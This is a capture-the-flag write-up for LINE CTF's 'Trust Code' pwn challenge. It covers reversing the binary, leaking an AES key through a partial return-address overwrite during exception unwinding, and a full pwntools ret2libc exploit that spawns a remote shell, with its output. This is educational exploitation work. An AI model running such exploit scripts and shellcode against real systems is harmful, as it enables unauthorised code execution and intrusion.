# **Trust Code**

## Description
> Can you trust your own code?  
nc 35.190.227.47 10009  
Environment: Ubuntu20.04 dcfba5b03622f31b1d0673c3f5f14181012b46199abca3ba4af6c1433f03ffd9 /lib/x86_64-linux-gnu/libc-2.31.so  

```console
┌──(kali㉿kali)-[~/Desktop/pwn/linectf/trust]
└─$ checksec trust_code
[*] '/home/kali/Desktop/pwn/linectf/trust/trust_code'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
                                                                                            
┌──(kali㉿kali)-[~/Desktop/pwn/linectf/trust]
└─$ ./trust_code        
iv> AAA
code> AA

= Executed =

Sorry for the inconvenience, there was a problem while decrypting code.

```

## Reversing

So we can see that we are dealing with 64-bit binary with almost all of the standard mitigations. And when we try to run it, we have to input `iv` and `code`. (IV here is actually Initialization Vector which is probably related to AES encryption)  
Now let's take a look at the decompiled code in ghidra  

```c
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  launch();
  if (*(long *)(in_FS_OFFSET + 0x28) == lVar1) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

```c
void launch(void)

{
  int __fd;
  long in_FS_OFFSET;
  undefined local_18 [8];
  undefined4 uStack16;
  undefined4 uStack12;
  long local_8;
  
  local_8 = *(long *)(in_FS_OFFSET + 0x28);
  _local_18 = ZEXT816(0);
  alarm(0x1e);
  signal(0xe,alarm_handler);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  __fd = open("secret_key.txt",0);
  read(__fd,local_18,0x10);
  close(__fd);
  secret_key._0_4_ = local_18._0_4_;
  secret_key._4_4_ = local_18._4_4_;
  secret_key._8_4_ = uStack16;
  secret_key._12_4_ = uStack12;
  service();
  if (*(long *)(in_FS_OFFSET + 0x28) == local_8) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
We can see that there is the `secret_key` read from file, and that value is stored in the `.bss` section.  
```c
void service(void)

{
  long in_FS_OFFSET;
  undefined4 local_18;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  long local_8;
  
  local_8 = *(long *)(in_FS_OFFSET + 0x28);
  printf("iv> ");
  read(0,&local_18,0x20);
  iv._0_4_ = local_18;
  iv._4_4_ = uStack20;
  iv._8_4_ = uStack16;
  iv._12_4_ = uStack12;
  loop();
  if (*(long *)(in_FS_OFFSET + 0x28) == local_8) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
We can immediately recognize a buffer-overflow. It read `0x20` bytes into `local_18` which will overide `local_8` - the canary and the saved return address afterward  
Note that: there is no saved `rbp` on the stack ( this is because of the compiler optimization, which led to the `rbp` register become free to use and not only for the purpose of creating the stack frame)
```asm
        00101756 48  39  c8       CMP        RAX ,RCX
        00101759 0f  85  05       JNZ        LAB_00101764
                 00  00  00
        0010175f 48  83  c4  28    ADD        RSP ,0x28
        00101763 c3              RET
```
Here is the stack  
```console
gef➤  x/4gx 0x7fffffffde40
0x7fffffffde40: 0x4141414141414141      0x4242424242424242
0x7fffffffde50: 0x7c72b79cb134760a      0x000055555555583c
```  
At first, this seems really difficult to exploit due to the canary, there is no way for us to redirect the code execution  
```c
long loop(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  while (loop_cont != 0) {
    run();
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == lVar1) {
    return lVar1;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```  
```c
void run(void)

{
  long lVar1;
  long in_FS_OFFSET;
  undefined4 local_28;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined4 local_18;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  long local_8;
  
  local_8 = *(long *)(in_FS_OFFSET + 0x28);
  lVar1 = read_code();
  local_28 = *(undefined4 *)(lVar1 + 0x10);
  uStack36 = *(undefined4 *)(lVar1 + 0x14);
  uStack32 = *(undefined4 *)(lVar1 + 0x18);
  uStack28 = *(undefined4 *)(lVar1 + 0x1c);
  local_18 = *(undefined4 *)(lVar1 + 0x20);
  uStack20 = *(undefined4 *)(lVar1 + 0x24);
  uStack16 = *(undefined4 *)(lVar1 + 0x28);
  uStack12 = *(undefined4 *)(lVar1 + 0x2c);
  execute((uchar *)&local_28);
  Shellcode::~Shellcode((Shellcode *)&local_28);
  if (*(long *)(in_FS_OFFSET + 0x28) == local_8) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```  
It seems like we have some kind of code execution, which we provide and stored at `local_28`, and also the maximum size of our code can only be `0x1c` bytes  
```c
undefined8 read_code(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  undefined local_38 [16];
  undefined local_28 [16];
  undefined local_18 [16];
  long local_8;
  
  local_8 = *(long *)(in_FS_OFFSET + 0x28);
  printf("code> ");
  local_18 = ZEXT816(0);
  local_28 = ZEXT816(0);
  local_38 = ZEXT816(0);
  read(0,local_38,0x30);
  uVar1 = decrypt(local_38);
  if (*(long *)(in_FS_OFFSET + 0x28) == local_8) {
    return uVar1;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```  
Our `code` input has the maximum size of `0x30` bytes, and have to go through some sort of `decrypt`  
```  
```c
uchar * decrypt(uchar *param_1)

{
  int iVar1;
  uchar *out;
  exception *this;
  long in_FS_OFFSET;
  AES_KEY local_100;
  long local_8;
  
  local_8 = *(long *)(in_FS_OFFSET + 0x28);
  out = (uchar *)operator.new[](0x30);
  AES_set_decrypt_key(secret_key,0x80,&local_100);
  AES_cbc_encrypt(param_1,out,0x30,&local_100,iv,0);
  iVar1 = strncmp((char *)out,"TRUST_CODE_ONLY!",0x10);
  if (iVar1 != 0) {
    this = (exception *)__cxa_allocate_exception(8);
    std::exception::exception(this);
                    /* WARNING: Subroutine does not return */
    __cxa_throw(this,&std::exception::typeinfo,std::exception::~exception);
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == local_8) {
    return out;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```  
What's all happening here is only AES 128 bit decryption with the `secret_key` in `CBC_MODE` with our `iv` (Initialization Vector). After the decryption of our provided code, it has to have some kinds of signature at the beginning which is `TRUST_CODE_ONLY!`. And if our decrypted code fail that check, it throws exceptions and terminate.  
That means to have our code execution, we need to leak the `secret_key`, use that to encrypt our code which has the format: "TRUST_CODE_ONLY!" + `payload`  
There is another important thing. In the `execute` function, before actually executing there is an `invalid_check`  
```c
undefined4 invalid_check(uchar *param_1)

{
  long in_FS_OFFSET;
  int local_1c;
  undefined4 local_c;
  
  local_1c = 0;
  do {
    if (0x1f < local_1c) {
      local_c = 0;
LAB_00101522:
      if (*(long *)(in_FS_OFFSET + 0x28) == *(long *)(in_FS_OFFSET + 0x28)) {
        return local_c;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    if ((param_1[local_1c] == '\x0f') || (param_1[local_1c] == '\x05')) {
      local_c = 0xffffffff;
      goto LAB_00101522;
    }
    local_1c = local_1c + 1;
  } while( true );
}
```  
Our code has 0x10 bytes that is the `TRUST_CODE_ONLY!` signature and the executed part `0x20` bytes that has to go through that check. What the check does is, find if there is opcode like `0x0f` or `0x05` in our payload. Because `\x0f\x05` is actually `syscall`. This kind of sanitization is quite easy to bypass.  
  
## Exploitation  
  
To leak the `secret_key` we will abuse the fact that when `__cxa_throw` there is the process of stack unwinding happening, which will call the deconstructor of all objects in the called function. My knowledge on this process is quite limited. I guess  that it uses the saved `rip` on the stack to find where the function is? And then to determine what deconstructor to call?  
There is a `Shellcode` deconstructor that write `0x20` bytes from address into `stdout`  
```c
void __thiscall Shellcode::~Shellcode(Shellcode *this)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\n= Executed =");
  write(1,this,0x20);
  *(undefined (*) [16])(this + 0x10) = ZEXT816(0);
  *(undefined (*) [16])this = ZEXT816(0);
  if (*(long *)(in_FS_OFFSET + 0x28) == lVar1) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```  
With this, i made a guess to overwrite the last 2 bytes of saved `rip` on the stack with the address after `execute`. This part:  
```c
  uStack12 = *(undefined4 *)(lVar1 + 0x2c);
  execute((uchar *)&local_28);
  Shellcode::~Shellcode((Shellcode *)&local_28);
```
And hopefully, it will call the `Shellcode` deconstructor second time, with a different pointer `this` and will print out something. Here's the result:  
```console
┌──(kali㉿kali)-[~/Desktop/pwn/linectf/trust]
└─$ python2 solve.py
[+] Opening connection to 35.190.227.47 on port 10009: Done
[DEBUG] Received 0x4 bytes:
    'iv> '
[DEBUG] Sent 0x1a bytes:
    'AAAAAAAAAAAAAAAAAAAAAAAAZV'
[DEBUG] Received 0x6 bytes:
    'code> '
[DEBUG] Sent 0x30 bytes:
    'TRUST_CODE_ONLY!TRUST_CODE_ONLY!TRUST_CODE_ONLY!'
[+] Receiving all data: Done (165B)
[DEBUG] Received 0xa5 bytes:
    00000000  0a 3d 20 45  78 65 63 75  74 65 64 20  3d 0a 00 00  │·= E│xecu│ted │=···│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 3d  │····│····│····│···=│
    00000030  20 45 78 65  63 75 74 65  64 20 3d 0a  00 1c 01 00  │ Exe│cute│d =·│····│
    00000040  00 00 00 00  79 00 00 00  c1 60 00 00  76 30 6e 56  │····│y···│·`··│v0nV│
    00000050  61 64 7a 6e  68 78 6e 76  24 6e 70 68  0a 53 6f 72  │adzn│hxnv│$nph│·Sor│
    00000060  72 79 20 66  6f 72 20 74  68 65 20 69  6e 63 6f 6e  │ry f│or t│he i│ncon│
    00000070  76 65 6e 69  65 6e 63 65  2c 20 74 68  65 72 65 20  │veni│ence│, th│ere │
    00000080  77 61 73 20  61 20 70 72  6f 62 6c 65  6d 20 77 68  │was │a pr│oble│m wh│
    00000090  69 6c 65 20  64 65 63 72  79 70 74 69  6e 67 20 63  │ile │decr│ypti│ng c│
    000000a0  6f 64 65 2e  0a                                     │ode.│·│
    000000a5
[*] Closed connection to 35.190.227.47 port 10009
```  
I had to run it several times, because of `PIE-enabled`, the last byte is unchanged, but the second last byte changes everytime.  
And indeed, the deconstructor was called twice, and we leaked the `secret_key`  
`secret_key = v0nVadznhxnv$nph`  

We are allowed to send as many payloads as possible, so there are many ways to exploit. Here's mine with ret2libc:  

```python
from pwn import *
from Crypto.Cipher import AES

context.arch = 'amd64'
context.endian = 'little'
context.bits = '64'

REMOTE = True
LOCAL = False
if REMOTE:
	p = remote('35.190.227.47',10009)
if LOCAL:
	p = gdb.debug('./trust_code')
key = 'v0nVadznhxnv$nph'
#My first payload was encrypted with iv = "\x00" 
cipher1 = AES.new(key, AES.MODE_CBC,iv='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

payload = '\x56\x90\xEC\x9A\xA4\xFB\x22\x9D\x3C\x1E\x3B\x74\xC1\x6E\x6C\xF3\x08\xA1\x49\xEB\x23\x5D\x96\x2C\xE9\x96\x2C\x40\x63\x23\x26\x6D\xA4\xC6\xFC\xEF\x74\x9C\x6E\x45\xFE\x01\xF8\x06\xCD\x7A\x98\x52'
#Because we was provided with libc, my exploit is quite simple, first payload leak the libc address, and the second payload we will perfrom ret2libc with one_gadget

#---LEAKING THE PUTS_LIBC ADDRESS WITH FIRST PAYLOAD---
#We defeat PIE by using the address already on the stack, and use these offset:
#puts_plt: 0x1110
#ADR_LEAKED: 0x158d
#puts_got: 0x7088

p.sendafter('> ', '\x00'*0x18)
p.sendafter('> ', payload)
log.info("Sending payload:\n{}".format(hexdump(payload)))
log.info("PAYLOAD:\n{}".format(disasm(cipher1.decrypt(payload)[17:] )))

#---CALCULATE THE LIBC ADDRESS---
puts_libc = u64(p.recv(6).ljust(8,"\x00"))
base_libc = puts_libc - 0x84450
log.info("Libc Base Address: " + hex(base_libc))
one_gadget = base_libc + 0xe3b31

#---RET2LIBC WITH SECOND PAYLOAD---
p.sendafter('> ','n')
cipher = AES.new(key, AES.MODE_CBC,iv='\xa4\xc6\xfc\xef\x74\x9c\x6e\x45\xfe\x01\xf8\x06\xcd\x7a\x98\x52')
last_payload = "TRUST_CODE_ONLY!\x49\xB8" + p64(one_gadget) + "\x48\x31\xD2\x4D\x31\xFF\x41\x50\xC3"+ "\x90"*(32-19)
enc = cipher.encrypt(last_payload)
p.sendafter('> ', enc)
log.info("Sending payload:\n{}".format(hexdump(enc)))
log.info("PAYLOAD:\n{}".format(disasm(last_payload[16:] )))

p.interactive()
```  

```console
┌──(kali㉿kali)-[~/Desktop/pwn/linectf/trust]
└─$ python2 solve.py
[+] Opening connection to 35.190.227.47 on port 10009: Done
[*] Sending payload:
    00000000  56 90 ec 9a  a4 fb 22 9d  3c 1e 3b 74  c1 6e 6c f3  │V···│··"·│<·;t│·nl·│
    00000010  08 a1 49 eb  23 5d 96 2c  e9 96 2c 40  63 23 26 6d  │··I·│#]·,│··,@│c#&m│
    00000020  a4 c6 fc ef  74 9c 6e 45  fe 01 f8 06  cd 7a 98 52  │····│t·nE│····│·z·R│
    00000030
[*] PAYLOAD:
       0:   8b 04 24                mov    eax, DWORD PTR [rsp]
       3:   66 ba fb 5a             mov    dx, 0x5afb
       7:   4c 89 c7                mov    rdi, r8
       a:   48 01 d7                add    rdi, rdx
       d:   49 c7 c5 78 5f 00 00    mov    r13, 0x5f78
      14:   49 89 f9                mov    r9, rdi
      17:   4d 29 e9                sub    r9, r13
      1a:   41 ff d1                call   r9
      1d:   90                      nop
      1e:   c3                      ret
[*] Libc Base Address: 0x7f77a6155000
[*] Sending payload:
    00000000  b5 a8 07 07  f2 a3 9b 7f  e6 00 5a c4  e1 88 a0 4d  │····│····│··Z·│···M│
    00000010  22 b8 46 57  23 b9 85 83  47 fa 1c 82  2c 41 9a a8  │"·FW│#···│G···│,A··│
    00000020  a8 a5 a2 a4  94 47 4b 5c  7b 52 a7 ea  31 8e 46 e2  │····│·GK\│{R··│1·F·│
    00000030
[*] PAYLOAD:
       0:   49 b8 31 8b 23 a6 77    movabs r8, 0x7f77a6238b31
       7:   7f 00 00 
       a:   48 31 d2                xor    rdx, rdx
       d:   4d 31 ff                xor    r15, r15
      10:   41 50                   push   r8
      12:   c3                      ret    
      13:   90                      nop
      14:   90                      nop
      15:   90                      nop
      16:   90                      nop
      17:   90                      nop
      18:   90                      nop
      19:   90                      nop
      1a:   90                      nop
      1b:   90                      nop
      1c:   90                      nop
      1d:   90                      nop
      1e:   90                      nop
      1f:   90                      nop
[*] Switching to interactive mode
$ ls
flag
run.sh
secret_key.txt
trust_code
$ cat flag
LINECTF{I_5h0uld_n0t_trust_my_c0de}$  
```  
The flag is: `LINECTF{I_5h0uld_n0t_trust_my_c0de}`


